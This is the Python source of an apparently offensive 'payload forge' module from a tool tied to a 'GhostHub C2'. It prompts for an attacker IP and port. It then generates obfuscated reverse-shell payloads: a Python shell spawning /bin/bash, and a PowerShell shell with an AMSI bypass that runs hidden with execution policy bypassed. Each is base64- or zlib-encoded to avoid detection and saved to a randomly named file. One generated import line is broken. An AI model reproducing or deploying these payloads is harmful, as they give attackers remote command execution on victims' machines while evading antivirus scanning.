import os
import random
import string
import base64
import questionary
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class PayloadForge:
    def __init__(self):
        self.output_dir = "payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def generate_random_name(self, extension):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{self.output_dir}/{name}.{extension}"

    def forge_python_revshell(self, lhost, lport):
        raw_code = f"""
import socket, os, pty, base64
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("{lhost}", {lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    except Exception:
        pass
connect()
        """.strip()
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"

    def forge_powershell_revshell(self, lhost, lport):
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        shell_logic = f"""
        $c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
            $sb = (iex $d 2>&1 | Out-String );
            $sendback = ([text.encoding]::ASCII).GetBytes($sb + "PS " + (pwd).Path + "> ");
            $s.Write($sendback,0,$sendback.Length);
            $s.Flush()
        }};
        $c.Close();
        """
        full_script = amsi_bypass + shell_logic.strip()
        encoded_command = base64.b64encode(
            full_script.encode('utf-16-le')).decode()
        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}"

    def run(self):
        draw_header("Payload Forge: msfvenom-Elite")

        lhost = questionary.text("LHOST (Attacker IP):", style=Q_STYLE).ask()
        if not lhost:
            return

        lport = questionary.text(
            "LPORT (Default 4444):", default="4444", style=Q_STYLE).ask()

        target_type = questionary.select(
            "Target Environment:",
            choices=[
                "Linux/Unix (Python Obfuscated)",
                "Windows (PowerShell + AMSI Bypass)",
                "macOS (Python Zlib-Compressed)"
            ],
            style=Q_STYLE
        ).ask()

        if "Linux" in target_type:
            payload = self.forge_python_revshell(lhost, lport)
            fname = self.generate_random_name("py")
        elif "Windows" in target_type:
            payload = self.forge_powershell_revshell(lhost, lport)
            fname = self.generate_random_name("ps1")
        elif "macOS" in target_type:
            import zlib
            raw = self.forge_python_revshell(lhost, lport)
            compressed = base64.b64encode(zlib.compress(raw.encode())).decode()
            payload = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"
            fname = self.generate_random_name("py")

        with open(fname, "w") as f:
            f.write(payload)

        console.print(Panel(
            f"[bold green][+] Payload Generated Successfully![/bold green]\n"
            f"[white]File Path:[/white] [cyan]{fname}[/cyan]\n\n"
            f"[dim]Note: Ensure GhostHub C2 is listening on {lhost}:{lport}[/dim]",
            title="Forge Result",
            border_style="green"
        ))
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def generate_shell():
    PayloadForge().run()
